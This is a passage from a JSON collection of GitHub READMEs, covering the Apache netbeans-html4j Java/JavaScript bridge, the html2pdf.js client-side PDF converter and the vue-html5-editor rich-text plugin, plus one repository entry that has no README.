JavaScript?\n\n[![Travis](https:\/\/travis-ci.org\/apache\/netbeans-html4j.svg?branch=master)](https:\/\/travis-ci.org\/apache\/netbeans-html4j)\n[![Linux](https:\/\/builds.apache.org\/buildStatus\/icon?job=netbeans-html4j-linux)](https:\/\/builds.apache.org\/job\/netbeans-html4j-linux\/)\n[![Windows](https:\/\/builds.apache.org\/buildStatus\/icon?job=netbeans-html4j-windows)](https:\/\/builds.apache.org\/job\/netbeans-html4j-windows)\n\nThe HTML\/Java library provides [basic building blocks](https:\/\/bits.netbeans.org\/html+java\/dev\/net\/java\/html\/js\/package-summary.html)\nas well as advanced [high level concepts](https:\/\/bits.netbeans.org\/html+java\/dev\/net\/java\/html\/json\/Model.html)\nto make communication between JavaScript and Java as smooth as possible.\n\nRead more in the [latest javadoc](https:\/\/bits.netbeans.org\/html+java\/dev\/) documentation.\n\n## Portable Applications\n\nEvery browser widget Java API offers ways for communication between Java and\nJavaScript running in such widget. However, each of them is unique - e.g. one\nwrites different code when communicating with [JavaFX WebView](https:\/\/docs.oracle.com\/javase\/8\/javafx\/api\/javafx\/scene\/web\/WebView.html),\ndifferent one when communicating with [Android WebView](https:\/\/developer.android.com\/reference\/android\/webkit\/WebView.html),\nyet another one when talking to [iOS WebView](https:\/\/developer.apple.com\/documentation\/uikit\/uiwebview).\n\nThe goal of HTML\/Java API is to **unify this communication**. By providing simple\nand highly portable [building blocks](https:\/\/bits.netbeans.org\/html+java\/dev\/net\/java\/html\/js\/package-summary.html)\none can create sophisticated APIs (like\n[UI bindings](https:\/\/bits.netbeans.org\/html+java\/dev\/net\/java\/html\/json\/package-summary.html),\n[charts](https:\/\/dukescript.com\/javadoc\/charts\/),\n[maps](https:\/\/dukescript.com\/javadoc\/leaflet4j\/),\n[canvas](https:\/\/dukescript.com\/javadoc\/canvas\/), or\n[SnapSVG](https:\/\/dukescript.com\/javadoc\/libs\/net\/java\/html\/lib\/snapsvg\/Snap\/package-summary.html))\nthat can be embedded into\n[Swing or JavaFX applications](https:\/\/bits.netbeans.org\/html+java\/dev\/net\/java\/html\/boot\/fx\/FXBrowsers.html),\nexecuted [headlessly on a server](https:\/\/bits.netbeans.org\/html+java\/dev\/net\/java\/html\/boot\/script\/Scripts.html)\nor executed anywhere HTML\/Java API was ported.\n\nVarious ports of this rendering pipeline were built including support for\npure [webkit desktop rendring](https:\/\/github.com\/dukescript\/dukescript-presenters\/),\n[Android WebView](https:\/\/dukescript.com\/javadoc\/presenters\/com\/dukescript\/presenters\/Android.html)\nand [iOS WebView](https:\/\/dukescript.com\/javadoc\/presenters\/com\/dukescript\/presenters\/iOS.html)\ndeveloped by [DukeScript project](https:\/\/dukescript.com\/).\n\nThis technology has also been adopted by some Java bytecode to JavaScript\ntranspilers - for example [TeaVM](http:\/\/teavm.org\/docs\/intro\/dukescript.html)\nor [Bck2Brwsr VM](https:\/\/github.com\/jtulach\/bck2brwsr\/) -\nas such you can also run the same Java application in a pluginless browser.\n\nPorting of HTML\/Java rendering pipeline is as easy as implementing\n[Fn.Presenter](https:\/\/bits.netbeans.org\/html+java\/dev\/org\/netbeans\/html\/boot\/spi\/Fn.Presenter.html)\ninterface and successfully passing the\n[test compatibility kit](https:\/\/bits.netbeans.org\/html+java\/dev\/org\/netbeans\/html\/json\/tck\/package-summary.html).\nSince version `1.7` the project provides pre-made protocol based\n[ProtoPresenter](https:\/\/bits.netbeans.org\/html+java\/dev\/org\/netbeans\/html\/presenters\/spi\/package-summary.html)\nskeleton to simplify integrations with new platforms.\n\n## Getting Started\n\nThe HTML\/Java API is IDE and build tool neutral. It can be used with\n[Ant](http:\/\/ant.apache.org), [Maven](http:\/\/maven.apache.org) or **Gradle**.\nIt is easy to edit it with [Eclipse](https:\/\/dukescript.com\/best\/practices\/2015\/07\/01\/DukeScript-with-Eclipse.html),\n[IntelliJ](https:\/\/dukescript.com\/best\/practices\/2016\/04\/19\/IDEA.html) or\n[NetBeans](https:\/\/dukescript.com\/getting_started.html). Here is a short introductory video to get started\nwith **NetBeans** 11.2 and its **Gradle** support:\n\n[![OpenJFX Lite by Geertjan](https:\/\/img.youtube.com\/vi\/cUSDknlhxcY\/0.jpg)](https:\/\/www.youtube.com\/watch?v=cUSDknlhxcY)\n\nThe most comprehensive getting started guide is available from\n[the DukeScript project](https:\/\/dukescript.com\/getting_started.html) website.\n\n## Contributing\n\nYou can contribute to development of this library by forking\nits [GitHub repository](https:\/\/github.com\/apache\/netbeans-html4j).\nChange, modify, test:\n\n```bash\n$ mvn clean install\n```\n\nand create a pull request, which may then be merged into the\nofficial [Apache repository](https:\/\/gitbox.apache.org\/repos\/asf?p=netbeans-html4j.git).\n\n### Full History\n\nThe origins of the code in this repository are older than\nits Apache existence. As such significant part of the history\n(before the code was donated to Apache) is kept in an\nindependent repository. To fully understand the code you may\nwant to merge the modern and ancient versions together:\n\n```bash\n$ git clone https:\/\/github.com\/apache\/netbeans-html4j.git html+java+both\n$ cd html+java+both\n$ git log boot\/src\/main\/java\/net\/java\/html\/boot\/BrowserBuilder.java\n```\n\nThis gives you just few log entries including the initial checkin and change of the\nfile headers to Apache. But then the magic comes:\n\n```bash\n$ git remote add emilian https:\/\/github.com\/emilianbold\/netbeans-html4j.git\n$ git fetch emilian\n$ git replace 408363d d029b8e\n```\n\nWhen you search the log, or use the blame tool, the full history is\navailable:\n\n```bash\n$ git log boot\/src\/main\/java\/net\/java\/html\/boot\/BrowserBuilder.java\n$ git blame boot\/src\/main\/java\/net\/java\/html\/boot\/BrowserBuilder.java\n```\n\nMany thanks to Emilian Bold who converted the ancient history to\n[his Git repository](https:\/\/github.com\/emilianbold\/netbeans-html4j)\nand made the magic possible!\n"},{"repo":"\/hackedteam\/vector-applet","language":"Java","readme_contents":"error: no README"},{"repo":"\/eKoopmans\/html2pdf.js","language":"JavaScript","readme_contents":"# html2pdf.js\n\nhtml2pdf.js converts any webpage or element into a printable PDF entirely client-side using [html2canvas](https:\/\/github.com\/niklasvh\/html2canvas) and [jsPDF](https:\/\/github.com\/MrRio\/jsPDF).\n\n## Table of contents\n\n- [Getting started](#getting-started)\n  - [HTML](#html)\n  - [NPM](#npm)\n  - [Bower](#bower)\n  - [Console](#console)\n- [Usage](#usage)\n  - [Advanced usage](#advanced-usage)\n    - [Workflow](#workflow)\n    - [Worker API](#worker-api)\n- [Options](#options)\n  - [Page-breaks](#page-breaks)\n    - [Page-break settings](#page-break-settings)\n    - [Page-break modes](#page-break-modes)\n    - [Example usage](#example-usage)\n  - [Image type and quality](#image-type-and-quality)\n- [Progress tracking](#progress-tracking)\n- [Dependencies](#dependencies)\n- [Contributing](#contributing)\n  - [Issues](#issues)\n  - [Tests](#tests)\n  - [Pull requests](#pull-requests)\n- [Credits](#credits)\n- [License](#license)\n\n## Getting started\n\n#### HTML\n\nThe simplest way to use html2pdf.js is to download `dist\/html2pdf.bundle.min.js` to your project folder and include it in your HTML with:\n\n```html\n<script src=\"html2pdf.bundle.min.js\"><\/script>\n```\n\n*Note: [Click here](#dependencies) for more information about using the unbundled version `dist\/html2canvas.min.js`.*\n\n#### NPM\n\nInstall html2pdf.js and its dependencies using NPM with `npm install --save html2pdf.js` (make sure to include `.js` in the package name).\n\n*Note: You can use NPM to create your project, but html2pdf.js **will not run in Node.js**, it must be run in a browser.*\n\n#### Bower\n\nInstall html2pdf.js and its dependencies using Bower with `bower install --save html2pdf.js` (make sure to include `.js` in the package name).\n\n#### Console\n\nIf you're on a webpage that you can't modify directly and wish to use html2pdf.js to capture a screenshot, you can follow these steps:\n\n1. Open your browser's console (instructions for different browsers [here](https:\/\/webmasters.stackexchange.com\/a\/77337\/94367)).\n2. Paste in this code:\n    ```js\n    function addScript(url) {\n        var script = document.createElement('script');\n        script.type = 'application\/javascript';\n        script.src = url;\n        document.head.appendChild(script);\n    }\n    addScript('https:\/\/raw.githack.com\/eKoopmans\/html2pdf\/master\/dist\/html2pdf.bundle.js');\n    ```\n3. You may now execute html2pdf.js commands directly from the console. To capture a default PDF of the entire page, use `html2pdf(document.body)`.\n\n## Usage\n\nOnce installed, html2pdf.js is ready to use. The following command will generate a PDF of `#element-to-print` and prompt the user to save the result:\n\n```js\nvar element = document.getElementById('element-to-print');\nhtml2pdf(element);\n```\n\n### Advanced usage\n\nEvery step of html2pdf.js is configurable, using its new Promise-based API. If html2pdf.js is called without arguments, it will return a `Worker` object:\n\n```js\nvar worker = html2pdf();  \/\/ Or:  var worker = new html2pdf.Worker;\n```\n\nThis worker has methods that can be chained sequentially, as each Promise resolves, and allows insertion of your own intermediate functions between steps. A prerequisite system allows you to skip over mandatory steps (like canvas creation) without any trouble:\n\n```js\n\/\/ This will implicitly create the canvas and PDF objects before saving.\nvar worker = html2pdf().from(element).save();\n```\n\n#### Workflow\n\nThe basic workflow of html2pdf.js tasks (enforced by the prereq system) is:\n\n```\n.from() -> .toContainer() -> .toCanvas() -> .toImg() -> .toPdf() -> .save()\n```\n\n#### Worker API\n\n| Method       | Arguments          | Description |\n|--------------|--------------------|-------------|\n| from         | src, type          | Sets the source (HTML string or element) for the PDF. Optional `type` specifies other sources: `'string'`, `'element'`, `'canvas'`, or `'img'`. |\n| to           | target             | Converts the source to the specified target (`'container'`, `'canvas'`, `'img'`, or `'pdf'`). Each target also has its own `toX` method that can be called directly: `toContainer()`, `toCanvas()`, `toImg()`, and `toPdf()`. |\n| output       | type, options, src | Routes to the appropriate `outputPdf` or `outputImg` method based on specified `src` (`'pdf'` (default) or `'img'`). |\n| outputPdf    | type, options      | Sends `type` and `options` to the jsPDF object's `output` method, and returns the result as a Promise (use `.then` to access). See the [jsPDF source code](https:\/\/rawgit.com\/MrRio\/jsPDF\/master\/docs\/jspdf.js.html#line992) for more info. |\n| outputImg    | type, options      | Returns the specified data type for the image as a Promise (use `.then` to access). Supported types: `'img'`, `'datauristring'`\/`'dataurlstring'`, and `'datauri'`\/`'dataurl'`. |\n| save         | filename           | Saves the PDF object with the optional filename (creates user download prompt). |\n| set          | opt                | Sets the specified properties. See [Options](#options) below for more details. |\n| get          | key, cbk           | Returns the property specified in `key`, either as a Promise (use `.then` to access), or by calling `cbk` if provided. |\n| then         | onFulfilled, onRejected | Standard Promise method, with `this` re-bound to the Worker, and with added progress-tracking (see [Progress](#progress) below). Note that `.then` returns a `Worker`, which is a subclass of Promise. |\n| thenCore     | onFulFilled, onRejected | Standard Promise method, with `this` re-bound to the Worker (no progress-tracking). Note that `.thenCore` returns a `Worker`, which is a subclass of Promise. |\n| thenExternal | onFulfilled, onRejected | True Promise method. Using this 'exits' the Worker chain - you will not be able to continue chaining Worker methods after `.thenExternal`. |\n| catch, catchExternal | onRejected | Standard Promise method. `catchExternal` exits the Worker chain - you will not be able to continue chaining Worker methods after `.catchExternal`. |\n| error        | msg                | Throws an error in the Worker's Promise chain. |\n\nA few aliases are also provided for convenience:\n\n| Method    | Alias     |\n|-----------|-----------|\n| save      | saveAs    |\n| set       | using     |\n| output    | export    |\n| then      | run       |\n\n## Options\n\nhtml2pdf.js can be configured using an optional `opt` parameter:\n\n```js\nvar element = document.getElementById('element-to-print');\nvar opt = {\n  margin:       1,\n  filename:     'myfile.pdf',\n  image:        { type: 'jpeg', quality: 0.98 },\n  html2canvas:  { scale: 2 },\n  jsPDF:        { unit: 'in', format: 'letter', orientation: 'portrait' }\n};\n\n\/\/ New Promise-based usage:\nhtml2pdf().set(opt).from(element).save();\n\n\/\/ Old monolithic-style usage:\nhtml2pdf(element, opt);\n```\n\nThe `opt` parameter has the following optional fields:\n\n|Name        |Type            |Default                         |Description                                                                                                 |\n|------------|----------------|--------------------------------|------------------------------------------------------------------------------------------------------------|\n|margin      |number or array |`0`                             |PDF margin (in jsPDF units). Can be a single number, `[vMargin, hMargin]`, or `[top, left, bottom, right]`. |\n|filename    |string          |`'file.pdf'`                    |The default filename of the exported PDF.                                                                   |\n|pagebreak   |object          |`{mode: ['css', 'legacy']}`     |Controls the pagebreak behaviour on the page. See [Page-breaks](#page-breaks) below.                        |\n|image       |object          |`{type: 'jpeg', quality: 0.95}` |The image type and quality used to generate the PDF. See [Image type and quality](#image-type-and-quality) below.|\n|enableLinks |boolean         |`true`                          |If enabled, PDF hyperlinks are automatically added ontop of all anchor tags.                                |\n|html2canvas |object          |`{ }`                           |Configuration options sent directly to `html2canvas` ([see here](https:\/\/html2canvas.hertzen.com\/configuration) for usage).|\n|jsPDF       |object          |`{ }`                           |Configuration options sent directly to `jsPDF` ([see here](http:\/\/rawgit.com\/MrRio\/jsPDF\/master\/docs\/jsPDF.html) for usage).|\n\n### Page-breaks\n\nhtml2pdf.js has the ability to automatically add page-breaks to clean up your document. Page-breaks can be added by CSS styles, set on individual elements using selectors, or avoided from breaking inside all elements (`avoid-all` mode).\n\nBy default, html2pdf.js will respect most CSS [`break-before`](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/CSS\/break-before), [`break-after`](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/CSS\/break-after), and [`break-inside`](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/CSS\/break-inside) rules, and also add page-breaks after any element with class `html2pdf__page-break` (for legacy purposes).\n\n#### Page-break settings\n\n|Setting   |Type            |Default             |Description |\n|----------|----------------|--------------------|------------|\n|mode      |string or array |`['css', 'legacy']` |The mode(s) on which to automatically add page-breaks. One or more of `'avoid-all'`, `'css'`, and `'legacy'`. |\n|before    |string or array |`[]`                |CSS selectors for which to add page-breaks before each element. Can be a specific element with an ID (`'#myID'`), all elements of a type (e.g. `'img'`), all of a class (`'.myClass'`), or even `'*'` to match every element. |\n|after     |string or array |`[]`                |Like 'before', but adds a page-break immediately after the element. |\n|avoid     |string or array |`[]`                |Like 'before', but avoids page-breaks on these elements. You can enable this feature on every element using the 'avoid-all' mode. |\n\n#### Page-break modes\n\n| Mode      | Description |\n|-----------|-------------|\n| avoid-all | Automatically adds page-breaks to avoid splitting any elements across pages. |\n| css       | Adds page-breaks according to the CSS `break-before`, `break-after`, and `break-inside` properties. Only recognizes `always\/left\/right` for before\/after, and `avoid` for inside. |\n| legacy    | Adds page-breaks after elements with class `html2pdf__page-break`. This feature may be removed in the future. |\n\n#### Example usage\n\n```js\n\/\/ Avoid page-breaks on all elements, and add one before #page2el.\nhtml2pdf().set({\n  pagebreak: { mode: 'avoid-all', before: '#page2el' }\n});\n\n\/\/ Enable all 'modes', with no explicit elements.\nhtml2pdf().set({\n  pagebreak: { mode: ['avoid-all', 'css', 'legacy'] }\n});\n\n\/\/ No modes, only explicit elements.\nhtml2pdf().set({\n  pagebreak: { before: '.beforeClass', after: ['#after1', '#after2'], avoid: 'img' }\n});\n```\n\n### Image type and quality\n\nYou may customize the image type and quality exported from the canvas by setting the `image` option. This must be an object with the following fields:\n\n|Name        |Type            |Default                       |Description                                                                                  |\n|------------|----------------|------------------------------|---------------------------------------------------------------------------------------------|\n|type        |string          |'jpeg'                        |The image type. HTMLCanvasElement only supports 'png', 'jpeg', and 'webp' (on Chrome).       |\n|quality     |number          |0.95                          |The image quality, from 0 to 1. This setting is only used for jpeg\/webp (not png).           |\n\nThese options are limited to the available settings for [HTMLCanvasElement.toDataURL()](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/API\/HTMLCanvasElement\/toDataURL), which ignores quality settings for 'png' images. To enable png image compression, try using the [canvas-png-compression shim](https:\/\/github.com\/ShyykoSerhiy\/canvas-png-compression), which should be an in-place solution to enable png compression via the `quality` option.\n\n## Progress tracking\n\nThe Worker object returned by `html2pdf()` has a built-in progress-tracking mechanism. It will be updated to allow a progress callback that will be called with each update, however it is currently a work-in-progress.\n\n## Dependencies\n\nhtml2pdf.js depends on the external packages [html2canvas](https:\/\/github.com\/niklasvh\/html2canvas), [jsPDF](https:\/\/github.com\/MrRio\/jsPDF), and [es6-promise](https:\/\/github.com\/stefanpenner\/es6-promise). These dependencies are automatically loaded when using NPM or the bundled package.\n\nIf using the unbundled `dist\/html2pdf.min.js` (or its un-minified version), you must also include each dependency. Order is important, otherwise html2canvas will be overridden by jsPDF's own internal implementation:\n\n```html\n<script src=\"es6-promise.auto.min.js\"><\/script>\n<script src=\"jspdf.min.js\"><\/script>\n<script src=\"html2canvas.min.js\"><\/script>\n<script src=\"html2pdf.min.js\"><\/script>\n```\n\n## Contributing\n\n### Issues\n\nWhen submitting an issue, please provide reproducible code that highlights the issue, preferably by creating a fork of [this template jsFiddle](https:\/\/jsfiddle.net\/u6o6ne41\/) (which has html2pdf.js already loaded). Remember that html2pdf.js uses [html2canvas](https:\/\/github.com\/niklasvh\/html2canvas) and [jsPDF](https:\/\/github.com\/MrRio\/jsPDF) as dependencies, so it's a good idea to check each of those repositories' issue trackers to see if your problem has already been addressed.\n\n#### Known issues\n\n1. **Rendering:** The rendering engine html2canvas isn't perfect (though it's pretty good!). If html2canvas isn't rendering your content correctly, I can't fix it.\n    - You can test this with something like [this fiddle](https:\/\/jsfiddle.net\/eKoopmans\/z1rupL4c\/), to see if there's a problem in the canvas creation itself.\n\n2. **Node cloning (CSS etc):** The way html2pdf.js clones your content before sending to html2canvas is buggy. A fix is currently being developed - try out:\n    - direct file: Go to [html2pdf.js\/bugfix\/clone-nodes-BUILD](\/eKoopmans\/html2pdf.js\/tree\/bugfix\/clone-nodes-BUILD) and replace the files in your project with the relevant files (e.g. `dist\/html2pdf.bundle.js`)\n    - npm: `npm install eKoopmans\/html2pdf.js#bugfix\/clone-nodes-BUILD`\n    - Related project: [Bugfix: Cloned nodes](https:\/\/github.com\/eKoopmans\/html2pdf.js\/projects\/9)\n\n3. **Resizing:** Currently, html2pdf.js resizes the root element to fit onto a PDF page (causing internal content to \"reflow\").\n    - This is often desired behaviour, but not always.\n    - There are plans to add alternate behaviour (e.g. \"shrink-to-page\"), but nothing that's ready to test yet.\n    - Related project: [Feature: Single-page PDFs](https:\/\/github.com\/eKoopmans\/html2pdf.js\/projects\/1)\n\n4. **Rendered as image:** html2pdf.js renders all content into an image, then places that image into a PDF.\n    - This means text is *not selectable or searchable*, and causes large file sizes.\n    - This is currently unavoidable, however recent improvements in jsPDF mean that it may soon be possible to render straight into vector graphics.\n    - Related project: [Feature: New renderer](https:\/\/github.com\/eKoopmans\/html2pdf.js\/projects\/4)\n\n5. **Promise clashes:** html2pdf.js relies on specific Promise behaviour, and can fail when used with custom Promise libraries.\n    - In the next release, Promises will be sandboxed in html2pdf.js to remove this issue.\n    - Related project: [Bugfix: Sandboxed promises](https:\/\/github.com\/eKoopmans\/html2pdf.js\/projects\/11)\n\n6. **Maximum size:** HTML5 canvases have a [maximum height\/width](https:\/\/stackoverflow.com\/a\/11585939\/4080966). Anything larger will fail to render.\n    - This is a limitation of HTML5 itself, and results in large PDFs rendering completely blank in html2pdf.js.\n    - The jsPDF canvas renderer (mentioned in Known Issue #4) may be able to fix this issue!\n    - Related project: [Bugfix: Maximum canvas size](https:\/\/github.com\/eKoopmans\/html2pdf.js\/projects\/5)\n\n### Tests\n\nhtml2pdf.js is currently sorely lacking in unit tests. Any contributions or suggestions of automated (or manual) tests are welcome. This is high on the to-do list for this project.\n\n### Pull requests\n\nIf you want to create a new feature or bugfix, please feel free to fork and submit a pull request! Create a fork, branch off of `master`, and make changes to the `\/src\/` files (rather than directly to `\/dist\/`). You can test your changes by rebuilding with `npm run build`.\n\n## Credits\n\n[Erik Koopmans](https:\/\/github.com\/eKoopmans)\n\n#### Contributors\n\n- [@WilcoBreedt](https:\/\/github.com\/WilcoBreedt)\n- [@Ranger1230](https:\/\/github.com\/Ranger1230)\n\n#### Special thanks\n\n- [Sauce Labs](https:\/\/saucelabs.com\/) for unit testing.\n\n## License\n\n[The MIT License](http:\/\/opensource.org\/licenses\/MIT)\n\nCopyright (c) 2017-2019 Erik Koopmans <[http:\/\/www.erik-koopmans.com\/](http:\/\/www.erik-koopmans.com\/)>\n"},{"repo":"\/PeakTai\/vue-html5-editor","language":"JavaScript","readme_contents":"# \u7b80\u4ecb Intro \n\nVue-html5-editor\u662f\u4e00\u4e2aVue\u7684\u5bcc\u6587\u672c\u7f16\u8f91\u5668\u63d2\u4ef6\uff0c\u7b80\u6d01\u7075\u6d3b\u53ef\u6269\u5c55\uff0c\u9002\u7528\u4e8evue2.0\u4ee5\u4e0a\u7248\u672c\uff0c\u652f\u6301IE11.\n\nVue-html5-editor is an html5 wysiwyg editor for vue,easy and flexible,compatible with Vue.js 2.0+,support IE11.\n\n![screenshot](http:\/\/tai.coding.me\/vue-html5-editor\/editor.png?v=20160912)\n\n[\u70b9\u51fb\u67e5\u770b\u6f14\u793a\u6548\u679c Demo is here](http:\/\/tai.coding.me\/vue-html5-editor)\n\n# \u5b89\u88c5 Installation\n\n### Npm\n\n\n```bash\nnpm install vue-html5-editor --save-dev\n```\n\n\u5f15\u5165\u5e76\u5b89\u88c5\u4f5c\u4e3a\u5168\u5c40\u7ec4\u4ef6\n\nimport and install as global component\n\n```js\nimport Vue from 'vue'\nimport VueHtml5Editor from 'vue-html5-editor'\nVue.use(VueHtml5Editor,options);\n```\n\n\u540c\u6837\u4f60\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u5c40\u90e8\u7ec4\u4ef6\u4f7f\u7528\uff0c\u65b9\u4fbf\u5728\u4e0d\u540c\u7684\u573a\u666f\u91cc\u4f7f\u7528\u4e0d\u540c\u7684\u914d\u7f6e.\n\n```js\nconst editor1 = new VueHtml5Editor(options1)\nconst app1 = new Vue({\n    components:{\n        editor1\n    }\n})\nconst editor2 = new VueHtml5Editor(options2)\nconst app2 = new Vue({\n    components:{\n        editor2\n    }\n})\n```\n\n\n### \u6d4f\u89c8\u5668\u76f4\u63a5\u4f7f\u7528 browser\n\n```html\n<script src=\"serverpath\/vue.js\"><\/script>\n<script src=\"serverpath\/vue-html5-editor.js\"><\/script>\n```\n\u901a\u8fc7\u5168\u5c40\u53d8\u91cf`VueHtml5Editor`\u6765\u5b89\u88c5.\n\nInstall using global variable `VueHtml5Editor`.\n```js\nVue.use(VueHtml5Editor, options)\n```\n\n\n# \u4f7f\u7528\u8bf4\u660e Usage\n\n\u6a21\u677f\u4ee3\u7801\u5982\u4e0b\uff1a\n\ntemplate code as follows:\n\n```html\n<vue-html5-editor :content=\"content\" :height=\"500\"><\/vue-html5-editor>\n```\n\n# options\n\n```js\nVue.use(VueHtml5Editor, {\n    \/\/ \u5168\u5c40\u7ec4\u4ef6\u540d\u79f0\uff0c\u4f7f\u7528new VueHtml5Editor(options)\u65f6\u8be5\u9009\u9879\u65e0\u6548 \n    \/\/ global component name\n    name: \"vue-html5-editor\",\n    \/\/ \u662f\u5426\u663e\u793a\u6a21\u5757\u540d\u79f0\uff0c\u5f00\u542f\u7684\u8bdd\u4f1a\u5728\u5de5\u5177\u680f\u7684\u56fe\u6807\u540e\u53f0\u76f4\u63a5\u663e\u793a\u540d\u79f0\n    \/\/ if set true,will append module name to toolbar after icon\n    showModuleName: false,\n    \/\/ \u81ea\u5b9a\u4e49\u5404\u4e2a\u56fe\u6807\u7684class\uff0c\u9ed8\u8ba4\u4f7f\u7528\u7684\u662ffont-awesome\u63d0\u4f9b\u7684\u56fe\u6807\n    \/\/ custom icon class of built-in modules,default using font-awesome\n    icons: {\n        text: \"fa fa-pencil\",\n        color: \"fa fa-paint-brush\",\n        font: \"fa fa-font\",\n        align: \"fa fa-align-justify\",\n        list: \"fa fa-list\",\n        link: \"fa fa-chain\",\n        unlink: \"fa fa-chain-broken\",\n        tabulation: \"fa fa-table\",\n        image: \"fa fa-file-image-o\",\n        hr: \"fa fa-minus\",\n        eraser: \"fa fa-eraser\",\n        undo: \"fa-undo fa\",\n        \"full-screen\": \"fa fa-arrows-alt\",\n        info: \"fa fa-info\",\n    },\n    \/\/ \u914d\u7f6e\u56fe\u7247\u6a21\u5757\n    \/\/ config image module\n    image: {\n        \/\/ \u6587\u4ef6\u6700\u5927\u4f53\u79ef\uff0c\u5355\u4f4d\u5b57\u8282  max file size\n        sizeLimit: 512 * 1024,\n        \/\/ \u4e0a\u4f20\u53c2\u6570,\u9ed8\u8ba4\u628a\u56fe\u7247\u8f6c\u4e3abase64\u800c\u4e0d\u4e0a\u4f20\n        \/\/ upload config,default null and convert image to base64\n        upload: {\n            url: null,\n            headers: {},\n            params: {},\n            fieldName: {}\n        },\n        \/\/ \u538b\u7f29\u53c2\u6570,\u9ed8\u8ba4\u4f7f\u7528localResizeIMG\u8fdb\u884c\u538b\u7f29,\u8bbe\u7f6e\u4e3anull\u7981\u6b62\u538b\u7f29\n        \/\/ compression config,default resize image by localResizeIMG (https:\/\/github.com\/think2011\/localResizeIMG)\n        \/\/ set null to disable compression\n        compress: {\n            width: 1600,\n            height: 1600,\n            quality: 80\n        },\n        \/\/ \u54cd\u5e94\u6570\u636e\u5904\u7406,\u6700\u7ec8\u8fd4\u56de\u56fe\u7247\u94fe\u63a5\n        \/\/ handle response data\uff0creturn image url\n        uploadHandler(responseText){\n            \/\/default accept json data like  {ok:false,msg:\"unexpected\"} or {ok:true,data:\"image url\"}\n            var json = JSON.parse(responseText)\n            if (!json.ok) {\n                alert(json.msg)\n            } else {\n                return json.data\n            }\n        }\n    },\n    \/\/ \u8bed\u8a00\uff0c\u5185\u5efa\u7684\u6709\u82f1\u6587\uff08en-us\uff09\u548c\u4e2d\u6587\uff08zh-cn\uff09\n    \/\/default en-us, en-us and zh-cn are built-in\n    language: \"zh-cn\",\n    \/\/ \u81ea\u5b9a\u4e49\u8bed\u8a00\n    i18n: {\n        \/\/specify your language here\n        \"zh-cn\": {\n            \"align\": \"\u5bf9\u9f50\u65b9\u5f0f\",\n            \"image\": \"\u56fe\u7247\",\n            \"list\": \"\u5217\u8868\",\n            \"link\": \"\u94fe\u63a5\",\n            \"unlink\": \"\u53bb\u9664\u94fe\u63a5\",\n            \"table\": \"\u8868\u683c\",\n            \"font\": \"\u6587\u5b57\",\n            \"full screen\": \"\u5168\u5c4f\",\n            \"text\": \"\u6392\u7248\",\n            \"eraser\": \"\u683c\u5f0f\u6e05\u9664\",\n            \"info\": \"\u5173\u4e8e\",\n            \"color\": \"\u989c\u8272\",\n            \"please enter a url\": \"\u8bf7\u8f93\u5165\u5730\u5740\",\n            \"create link\": \"\u521b\u5efa\u94fe\u63a5\",\n            \"bold\": \"\u52a0\u7c97\",\n            \"italic\": \"\u503e\u659c\",\n            \"underline\": \"\u4e0b\u5212\u7ebf\",\n            \"strike through\": \"\u5220\u9664\u7ebf\",\n            \"subscript\": \"\u4e0a\u6807\",\n            \"superscript\": \"\u4e0b\u6807\",\n            \"heading\": \"\u6807\u9898\",\n            \"font name\": \"\u5b57\u4f53\",\n            \"font size\": \"\u6587\u5b57\u5927\u5c0f\",\n            \"left justify\": \"\u5de6\u5bf9\u9f50\",\n            \"center justify\": \"\u5c45\u4e2d\",\n            \"right justify\": \"\u53f3\u5bf9\u9f50\",\n            \"ordered list\": \"\u6709\u5e8f\u5217\u8868\",\n            \"unordered list\": \"\u65e0\u5e8f\u5217\u8868\",\n            \"fore color\": \"\u524d\u666f\u8272\",\n            \"background color\": \"\u80cc\u666f\u8272\",\n            \"row count\": \"\u884c\u6570\",\n            \"column count\": \"\u5217\u6570\",\n            \"save\": \"\u786e\u5b9a\",\n            \"upload\": \"\u4e0a\u4f20\",\n            \"progress\": \"\u8fdb\u5ea6\",\n            \"unknown\": \"\u672a\u77e5\",\n            \"please wait\": \"\u8bf7\u7a0d\u7b49\",\n            \"error\": \"\u9519\u8bef\",\n            \"abort\": \"\u4e2d\u65ad\",\n            \"reset\": \"\u91cd\u7f6e\"\n        }\n    },\n    \/\/ \u9690\u85cf\u4e0d\u60f3\u8981\u663e\u793a\u51fa\u6765\u7684\u6a21\u5757\n    \/\/ the modules you don't want\n    hiddenModules: [],\n    \/\/ \u81ea\u5b9a\u4e49\u8981\u663e\u793a\u7684\u6a21\u5757\uff0c\u5e76\u63a7\u5236\u987a\u5e8f\n    \/\/ keep only the modules you want and customize the order.\n    \/\/ can be used with hiddenModules together\n    visibleModules: [\n        \"text\",\n        \"color\",\n        \"font\",\n        \"align\",\n        \"list\",\n        \"link\",\n        \"unlink\",\n        \"tabulation\",\n        \"image\",\n        \"hr\",\n        \"eraser\",\n        \"undo\",\n        \"full-screen\",\n        \"info\",\n    ],\n    \/\/ \u6269\u5c55\u6a21\u5757\uff0c\u5177\u4f53\u53ef\u4ee5\u53c2\u8003examples\u6216\u67e5\u770b\u6e90\u7801\n    \/\/ extended modules\n    modules: {\n        \/\/omit,reference to source code of build-in modules\n    }\n})\n```\n\n# \u7ec4\u4ef6\u5c5e\u6027 attributes\n\n```html\n<editor :content=\"content\" :height=\"500\" :z-index=\"1000\" :auto-height=\"true\" :show-module-name=\"false\"><\/editor>\n```\n\n### content\n\n\u7f16\u8f91\u5185\u5bb9\n\nThe html content to edit\n\n### height\n\n\u7f16\u8f91\u5668\u9ad8\u5ea6\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86`auto-height`\u4e3atrue\uff0c\u5c06\u8bbe\u7f6e\u4e3a\u7f16\u8f91\u5668\u7684\u6700\u5c0f\u9ad8\u5ea6.\n\nThe height or min-height ( if auto-height is true ) of editor.\n\n### z-index\n\n\u5c42\u7ea7\uff0c\u5c06\u4f1a\u8bbe\u7f6e\u7f16\u8f91\u5668\u5bb9\u91cf\u7684`z-index`\u6837\u5f0f\u5c5e\u6027,\u9ed8\u8ba4\u4e3a1000.\n\nSets z-index style property of editor,default 1000.\n\n### auto-height\n\n\u662f\u5426\u81ea\u52a8\u6839\u636e\u5185\u5bb9\u63a7\u5236\u7f16\u8f91\u5668\u9ad8\u5ea6,\u9ed8\u8ba4\u4e3atrue.\n\nResize editor height automatically,default true.\n\n### 